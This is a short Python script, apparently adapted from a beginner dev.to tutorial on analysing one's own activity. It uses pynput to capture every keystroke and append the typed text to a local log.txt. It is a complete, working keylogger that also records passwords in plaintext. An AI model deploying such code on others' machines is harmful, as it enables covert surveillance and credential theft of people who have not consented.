# From the article by Mustafa Anas on dev.to:
#    https://dev.to/mustafaanaskh99/for-beginners-analyse-your-own-daily-activity-by-
#    building-a-python-keylogger-44kc?fbclid=IwAR1MOR5g1DQD-j1bNv6Ap-
#    u9NaQYSnuAjbBCJ5pHoRha5ZS60oMBKm2kOx8
#
# mainly usefol for keyboard interaction (setting a listener)
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(e):
    global keys, count
    keys.append(e)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a+") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("  ")
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()
